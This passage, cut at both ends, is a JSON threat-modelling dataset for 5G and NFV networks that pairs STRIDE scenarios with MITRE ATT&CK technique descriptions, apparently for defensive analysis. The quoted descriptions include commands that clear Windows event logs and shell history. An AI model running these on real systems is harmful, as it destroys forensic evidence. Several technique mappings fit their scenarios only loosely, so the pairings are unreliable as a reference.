                "description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)",
                "id": "attack-pattern--1126cab1-c700-412f-a510-61f4937bb096",
                "technique_id": "T1053.007"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and alters the data between edge nodes and the cloud to inject malicious payloads",
            "Assumptions": [
                {
                    "Assumption": "Man-in-the-middle interception is possible due to weak encryption",
                    "Role": "Attacker",
                    "Condition": "Weak encryption protocols"
                },
                {
                    "Assumption": "There is no verification of data integrity between nodes",
                    "Role": "Network Administrator",
                    "Condition": "Lack of integrity verification"
                },
                {
                    "Assumption": "Network traffic is not adequately monitored for anomalies",
                    "Role": "Security Administrator",
                    "Condition": "Inadequate network monitoring"
                }
            ],
            "Potential Impact": "Injection of malicious code, potential data corruption, and service disruption",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data interception",
                "man-in-the-middle",
                "payload injection"
            ],
            "mitre_technique": {
                "name": "Disable Crypto Hardware",
                "description": "Adversaries disable a network device\u2019s dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data.\n\nMany network devices such as routers, switches, and firewalls, perform encryption on network traffic to secure transmission across networks. Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering. When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use of [Modify System Image](https://attack.mitre.org/techniques/T1601), forcing the use of software to perform encryption on general processors. This is typically used in conjunction with attacks to weaken the strength of the cipher in software (e.g., [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001)). (Citation: Cisco Blog Legacy Device Attacks)",
                "id": "attack-pattern--7efba77e-3bc4-4ca5-8292-d8201dcd64b5",
                "technique_id": "T1600.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker's actions within the system are not adequately logged, allowing them to deny their malicious activities",
            "Assumptions": [
                {
                    "Assumption": "The system lacks comprehensive logging of all critical actions",
                    "Role": "System Administrator",
                    "Condition": "Insufficient logging"
                },
                {
                    "Assumption": "Monitoring tools do not provide detailed audit trails",
                    "Role": "Security Administrator",
                    "Condition": "Poor auditing tools"
                },
                {
                    "Assumption": "The attacker can manipulate or delete logs",
                    "Role": "Attacker",
                    "Condition": "Log access"
                }
            ],
            "Potential Impact": "Inability to trace malicious actions back to the attacker, impeding incident response",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log manipulation",
                "audit trail",
                "logging"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An insider performs unauthorized changes in the network configuration and denies the activity due to lack of proper records",
            "Assumptions": [
                {
                    "Assumption": "The insider has administrative privileges",
                    "Role": "Insider",
                    "Condition": "Administrative access"
                },
                {
                    "Assumption": "Configuration changes are not being logged properly",
                    "Role": "Network Administrator",
                    "Condition": "Inadequate logging"
                },
                {
                    "Assumption": "There is no effective monitoring for changes",
                    "Role": "Security Administrator",
                    "Condition": "Lack of change monitoring"
                }
            ],
            "Potential Impact": "Unauthorized changes go unrecorded, hindering forensic analysis and accountability",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "configuration change",
                "insider threat",
                "logging"
            ],
            "mitre_technique": {
                "name": "Clear Command History",
                "description": "In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.\n\nOn Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions.\n\nAdversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.  \n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>).(Citation: US-CERT-TA18-106A)\n\nOn Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.\n\nThe <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.(Citation: Microsoft PowerShell Command History)\n\nAdversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)",
                "id": "attack-pattern--3aef9463-9a7a-43ba-8957-a867e07c1e6a",
                "technique_id": "T1070.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies sending malicious commands to a VNF because of poor authentication and logging mechanisms",
            "Assumptions": [
                {
                    "Assumption": "Command invocations are not logged with adequate detail",
                    "Role": "Security Administrator",
                    "Condition": "Poor command logging"
                },
                {
                    "Assumption": "The attacker is able to invoke commands without proper authentication",
                    "Role": "Attacker",
                    "Condition": "Weak authentication"
                },
                {
                    "Assumption": "Logs can be altered or deleted by unauthorized entities",
                    "Role": "System Administrator",
                    "Condition": "Weak log protection"
                }
            ],
            "Potential Impact": "Malicious commands executed with no traceability, obstructing incident investigation",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "command injection",
                "logging",
                "authentication"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A vulnerability in the VNFs allows an attacker to exfiltrate sensitive data from specific network slices",
            "Assumptions": [
                {
                    "Assumption": "The attacker can exploit the identified vulnerability",
                    "Role": "Attacker",
                    "Condition": "Vulnerability exploitation"
                },
                {
                    "Assumption": "Sensitive data within VNFs is not properly encrypted",
                    "Role": "Security Administrator",
                    "Condition": "Lack of encryption"
                },
                {
                    "Assumption": "No proper monitoring of data exfiltration attempts",
                    "Role": "Network Administrator",
                    "Condition": "Weak monitoring"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive data",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data exfiltration",
                "vulnerability exploitation",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Data traversing between the edge and cloud is intercepted by an attacker",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted without adequate encryption",
                    "Role": "Network Administrator",
                    "Condition": "Weak encryption protocols"
                },
                {
                    "Assumption": "The attacker can perform a man-in-the-middle attack",
                    "Role": "Attacker",
                    "Condition": "Interception capability"
                },
                {
                    "Assumption": "Network traffic is not adequately monitored for anomalies",
                    "Role": "Security Administrator",
                    "Condition": "Inadequate network monitoring"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive data during transmission",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data interception",
                "man-in-the-middle",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker uses exposed APIs or external interfaces to access sensitive configuration data",
            "Assumptions": [
                {
                    "Assumption": "The APIs or interfaces are inadequately secured",
                    "Role": "System Administrator",
                    "Condition": "Weak API security"
                },
                {
                    "Assumption": "Access controls on APIs/interfaces are poorly enforced",
                    "Role": "Security Administrator",
                    "Condition": "Poor access control"
                },
                {
                    "Assumption": "Logging and monitoring of API usage is insufficient",
                    "Role": "Network Administrator",
                    "Condition": "Inadequate logging"
                }
            ],
            "Potential Impact": "Exposure of sensitive configuration or operational data",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "api exploitation",
                "access control",
                "data exposure"
            ],
            "mitre_technique": {
                "name": "Use Alternate Authentication Material",
                "description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system\u2014either in memory or on disk\u2014it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\n",
                "id": "attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814",
                "technique_id": "T1550"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods a specific network slice with traffic, leading to service disruption",
            "Assumptions": [
                {
                    "Assumption": "The attacker can generate significant traffic volume",
                    "Role": "Attacker",
                    "Condition": "Resource availability"
                },
                {
                    "Assumption": "Network slices are not isolated effectively to prevent overflow impact",
                    "Role": "Network Administrator",
                    "Condition": "Poor slice isolation"
                },
                {
                    "Assumption": "No adequate rate limiting or traffic filtering mechanisms in place",
                    "Role": "Security Administrator",
                    "Condition": "Lack of traffic controls"
                }
            ],
            "Potential Impact": "Service disruption due to unavailability of targeted network slice",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "traffic flooding",
                "service disruption",
                "network slice"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A malicious VNF deployed in the network monopolizes shared resources, degrading service for other slices",
            "Assumptions": [
                {
                    "Assumption": "The attacker can deploy or control a VNF",
                    "Role": "Attacker",
                    "Condition": "VNF deployment"
                },
                {
                    "Assumption": "Resource allocation policies are not adequately enforced",
                    "Role": "Network Administrator",
                    "Condition": "Loose resource control"
                },
                {
                    "Assumption": "There is no monitoring for resource usage anomalies",
                    "Role": "Security Administrator",
                    "Condition": "Inadequate resource monitoring"
                }
            ],
            "Potential Impact": "Service degradation across multiple network slices due to resource starvation",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "resource exhaustion",
                "service degradation",
                "network slice"
            ],
            "mitre_technique": {
                "name": "Resource Hijacking",
                "description": "Adversaries may leverage the resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability. \n\nOne common purpose for Resource Hijacking is to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive.(Citation: Kaspersky Lazarus Under The Hood Blog 2017) Servers and cloud-based systems are common targets because of the high potential for available resources, but user endpoint systems may also be compromised and used for Resource Hijacking and cryptocurrency mining.(Citation: CloudSploit - Unused AWS Regions) Containerized environments may also be targeted due to the ease of deployment via exposed APIs and the potential for scaling mining activities by deploying or compromising multiple containers within an environment or cluster.(Citation: Unit 42 Hildegard Malware)(Citation: Trend Micro Exposed Docker APIs)\n\nAdditionally, some cryptocurrency mining malware identify then kill off processes for competing malware to ensure it\u2019s not competing for resources.(Citation: Trend Micro War of Crypto Miners)\n\nAdversaries may also use malware that leverages a system's network bandwidth as part of a botnet in order to facilitate [Network Denial of Service](https://attack.mitre.org/techniques/T1498) campaigns and/or to seed malicious torrents.(Citation: GoBotKR) Alternatively, they may engage in proxyjacking by selling use of the victims' network bandwidth and IP address to proxyware services.(Citation: Sysdig Proxyjacking)",
                "id": "attack-pattern--cd25c1b4-935c-4f0e-ba8d-552f28bc4783",
                "technique_id": "T1496"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An external connection or interface is exploited to disrupt communication between the 5G core and external networks",
            "Assumptions": [
                {
                    "Assumption": "The attacker can exploit the external interfaces",
                    "Role": "Attacker",
                    "Condition": "Interface exploitability"
                },
                {
                    "Assumption": "Redundant paths and failover mechanisms are not in place",
                    "Role": "Network Administrator",
                    "Condition": "Single points of failure"
                },
                {
                    "Assumption": "No sufficient monitoring and throttling of external connections",
                    "Role": "Security Administrator",
                    "Condition": "Lack of control mechanisms"
                }
            ],
            "Potential Impact": "Disruption of services relying on external network connectivity",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "interface disruption",
                "external connection",
                "network communication"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability to gain elevated privileges within the NFVO",
            "Assumptions": [
                {
                    "Assumption": "Existing vulnerabilities within NFVO are unpatched",
                    "Role": "Security Administrator",
                    "Condition": "Pending vulnerabilities"
                },
                {
                    "Assumption": "The attacker has initial access to the NFVO environment",
                    "Role": "Attacker",
                    "Condition": "Environment access"
                },
                {
                    "Assumption": "Privilege escalation monitoring is inadequate",
                    "Role": "Network Administrator",
                    "Condition": "Weak monitoring"
                }
            ],
            "Potential Impact": "Unauthorized administrative control over network orchestration functions",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "vulnerability exploitation",
                "privilege escalation",
                "administrative control"
            ],
            "mitre_technique": {
                "name": "Image File Execution Options Injection",
                "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application\u2019s IFEO will be prepended to the application\u2019s name, effectively launching the new process under the debugger (e.g., <code>C:\\dbg\\ntsd.exe -g  notepad.exe</code>). (Citation: Microsoft Dev Blog IFEO Mar 2010)\n\nIFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<executable></code> where <code>&lt;executable&gt;</code> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)\n\nIFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\</code>. (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)\n\nSimilar to [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures \"cmd.exe,\" or another program that provides backdoor access, as a \"debugger\" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the \"debugger\" program to be executed with SYSTEM privileges. (Citation: Tilbury 2014)\n\nSimilar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Elastic Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.\n\nMalware may also use IFEO to [Impair Defenses](https://attack.mitre.org/techniques/T1562) by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)",
                "id": "attack-pattern--6d4a7fb3-5a24-42be-ae61-6728a2b581f6",
                "technique_id": "T1546.012"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A malicious insider leverages legitimate credentials to elevate their privileges on critical network functions",
            "Assumptions": [
                {
                    "Assumption": "The insider has legitimate credentials with partial access",
                    "Role": "Insider",
                    "Condition": "Credential possession"
                },
                {
                    "Assumption": "Access controls are not sufficiently granular",
                    "Role": "Security Administrator",
                    "Condition": "Loose access controls"
                },
                {
                    "Assumption": "Monitoring of privilege changes is insufficient",
                    "Role": "Network Administrator",
                    "Condition": "Lack of privilege monitoring"
                }
            ],
            "Potential Impact": "Administrative access to critical network functions, leading to potential misuse",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "insider threat",
                "access control",
                "privilege abuse"
            ],
            "mitre_technique": {
                "name": "Additional Container Cluster Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled user or service account to maintain persistent access to a container orchestration system. For example, an adversary with sufficient permissions may create a RoleBinding or a ClusterRoleBinding to bind a Role or ClusterRole to a Kubernetes account.(Citation: Kubernetes RBAC)(Citation: Aquasec Kubernetes Attack 2023) Where attribute-based access control (ABAC) is in use, an adversary with sufficient permissions may modify a Kubernetes ABAC policy to give the target account additional permissions.(Citation: Kuberentes ABAC)\n \nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised.  \n\nNote that where container orchestration systems are deployed in cloud environments, as with Google Kubernetes Engine, Amazon Elastic Kubernetes Service, and Azure Kubernetes Service, cloud-based  role-based access control (RBAC) assignments or ABAC policies can often be used in place of or in addition to local permission assignments.(Citation: Google Cloud Kubernetes IAM)(Citation: AWS EKS IAM Roles for Service Accounts)(Citation: Microsoft Azure Kubernetes Service Service Accounts) In these cases, this technique may be used in conjunction with [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).",
                "id": "attack-pattern--35d30338-5bfa-41b0-a170-ec06dfd75f64",
                "technique_id": "T1098.006"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits configuration errors to gain higher privileges in VNFs",
            "Assumptions": [
                {
                    "Assumption": "Existing configuration errors are present",
                    "Role": "Network Administrator",
                    "Condition": "Misconfigurations"
                },
                {
                    "Assumption": "The attacker has initial access to the VNF environment",
                    "Role": "Attacker",
                    "Condition": "Environment access"
                },
                {
                    "Assumption": "No sufficient checks for configuration integrity",
                    "Role": "Security Administrator",
                    "Condition": "Weak configuration checks"
                }
            ],
            "Potential Impact": "Unauthorized control over VNFs with potential for misuse and data tampering",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "configuration exploitation",
                "environment access",
                "administrative control"
            ],
            "mitre_technique": {
                "name": "Trusted Relationship",
                "description": "Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.\n\nOrganizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, [Valid Accounts](https://attack.mitre.org/techniques/T1078) used by the other party for access to internal network systems may be compromised and used.(Citation: CISA IT Service Providers)\n\nIn Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant.(Citation: Office 365 Delegated Administration)",
                "id": "attack-pattern--9fa07bef-9c81-421e-a8e5-ad4366c5a925",
                "technique_id": "T1199"
            }
        }
    ]
},
{
    "case_number": "3",
    "batch_number": "6",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof a network function (NF) to gain unauthorized access to network slices.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to network traffic or control plane signaling.",
                    "Role": "Attacker",
                    "Condition": "Network access through compromised or unauthenticated nodes."
                },
                {
                    "Assumption": "Authentication mechanisms between NFs are weak or improperly configured.",
                    "Role": "Network Administrator",
                    "Condition": "Misconfigured or absent mutual authentication mechanisms."
                },
                {
                    "Assumption": "The attacker can craft malicious messages that mimic legitimate NFs.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of NF communication protocols and formats."
                }
            ],
            "Potential Impact": "Unauthorized access to network slices, leading to data confidentiality breaches and potential tampering with network operations.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network functions",
                "control plane",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "DHCP Spoofing",
                "description": "Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nDHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.(Citation: rfc2131) The typical server-client interaction is as follows: \n\n1. The client broadcasts a `DISCOVER` message.\n\n2. The server responds with an `OFFER` message, which includes an available network address. \n\n3. The client broadcasts a `REQUEST` message, which includes the network address offered. \n\n4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters.\n\nAdversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g) Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.\n\nDHCPv6 clients can receive network configuration information without being assigned an IP address by sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address.(Citation: rfc3315) Adversaries may use their rogue DHCP server to respond to 